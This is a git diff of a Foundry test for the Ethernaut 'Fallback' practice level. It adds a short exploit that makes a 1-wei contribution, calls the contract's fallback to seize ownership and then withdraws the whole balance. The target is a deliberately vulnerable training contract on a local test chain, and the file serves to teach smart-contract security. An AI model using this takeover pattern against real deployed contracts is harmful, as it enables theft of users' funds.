@@ -2,33 +2,46 @@
 pragma solidity ^0.8.0;
 
 import "tests/Test.sol";
-import "../../src/1.Fallback/Level.sol";
-import "../../interface/IFallback.sol";
+import "../../src/Fallback/Level.sol";
+import "forge-std/console.sol";
 
 interface IFallback {
     function owner() external view returns(address);
 
     function contributions(address) external view returns(uint256);
+
+    function contribute() external payable;
+
+    function withdraw() external;
 }
 
 contract FallbackTest is Test {
-    address immutable deployer;
-    address immutable attacker;
-    IFallback immutable fallbhack;
+    IFallback fallbhack;
 
-    constructor(address _deployer, IFallback _fallbhack) {
-        deployer = 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266;
-        attacker = 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266;
-        fallbhack = IFallback(0x9fe46736679d2d9a65f0992f2272de9f3c7fa6e0);
-    }
+    address deployer = address(100);
+    address attacker = address(101);
 
     function setUp() public {
-
+        vm.prank(deployer); // deploy the contract as deployer
+        fallbhack = IFallback(address(new Fallback()));
+        uint256 contrib = fallbhack.contributions(deployer);
+        deal(address(fallbhack), contrib);
     }
 
     function testAttack() public {
-        console.log(address(this).balance);
+        /* Setup stuff, no need to touch */
+        uint256 balBefore = address(fallbhack).balance;
+        vm.startPrank(attacker);
+        vm.deal(attacker, 5 ether);
+
+        /* Write your code here */  
+        fallbhack.contribute{value: 1 wei}(); // Just add a contribution
+        payable(address(fallbhack)).call{value: 1 wei}(""); // Claim ownership
+        fallbhack.withdraw(); // Withdraw funds
+        /* Write your code here */ 
+
+        /* Validating the test */
         assertEq(fallbhack.owner(), attacker);
-        assertEq(contributions[attacker], 0);
+        assertEq(address(fallbhack).balance, 0);
     }
 }
